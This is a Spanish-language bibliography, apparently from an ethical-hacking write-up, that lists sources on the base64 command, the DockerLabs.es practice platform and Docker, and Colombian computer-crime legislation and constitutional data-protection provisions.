- Canfield, J. (2021, September 8). Linux commands - base64 command. FreeKB. https://www.freekb.net/Article?id=2813

- Oracle Corporation. (2009, December 1). base64 - Sun OpenDS Standard Edition 2.2 command-line usage. Oracle Documentation. https://docs.oracle.com/cd/E19476-01/821-0508/base64.html

:pig_nose: Plataforma DockerLabs:

- 4k4m1m3. (2024, May 21). Plataforma Dockerlabs.es. 4k4m1m3 Blog. https://4k4m1m3.com/blog/dockerlabs-es/

- Rinku Tech. (2025). Dockerlabs.es: Aprende hacking ético gratis y con pocos recursos. Rinku Tech. https://rinku.tech/dockerlabs/

- El Pingüino de Mario. (2024, April 17). Nuestra plataforma para aprender CIBERSEGURIDAD y HACKING [Video]. YouTube. https://www.youtube.com/watch?v=24Y2GaD5764

- Alberlome. (2025, March 8). DockerLabs (Español). Ciberseguridad. https://ciberseguridad.alberlome.com/write-ups/dockerlabs-espanol

- Amazon Web Services. (2022). Contenedores de Docker | ¿Qué es Docker?. AWS. https://aws.amazon.com/es/docker/

- Red Hat. (2023, January 20). ¿Qué es Docker y cómo funciona?. Red Hat. https://www.redhat.com/es/topics/containers/what-is-docker

- Docker Inc. (2025, July 10). Docker: Accelerated container application development. Docker. https://www.docker.com

:cop: Marco Jurídico y Normativo (Legislación Colombiana):

- Congreso de la República de Colombia. (2009, enero 5). Ley 1273 de 2009. Por medio de la cual se modifica el Código Penal, se crea un nuevo bien jurídico tutelado - denominado "de la protección de la información y de los datos"- y se preservan integralmente los sistemas que utilicen las tecnologías de la información y las comunicaciones. Diario Oficial, 47.223. http://www.secretariasenado.gov.co/senado/basedoc/ley_1273_2009.html

- Policía Nacional de Colombia. (2025). Normatividad sobre delitos informáticos. Policía Nacional de Colombia. https://www.policia.gov.co/normatividad-sobre-delitos-informaticos

- Departamento Administrativo de la Función Pública. (2015). Ley 1273 de 2009 - Gestor normativo. Función Pública. https://www.funcionpublica.gov.co/eva/gestornormativo/norma.php?i=34492

- Asamblea Nacional Constituyente. (1991). Constitución Política de Colombia. Artículo 15. Justia Colombia. https://colombia.justia.com/nacionales/constitucion-politica-de-colombia/titulo-ii/capitulo-1/

- ACNUR. (2001). Constitución Política de Colombia. ACNUR. https://www.acnur.org/fileadmin/Documentos/BDL/2001/0219.pdf

- Ministerio de Comercio, Industria y Turismo. (2025). Constitución Política de Colombia 1991 - Artículo 15. MinCIT. https://www.mincit.gov.co/ministerio/normograma-sig/procesos-estrategicos/gestion-de-informacion-y-comunicacion/constitucion-politica/derechos/articulo-15.aspx

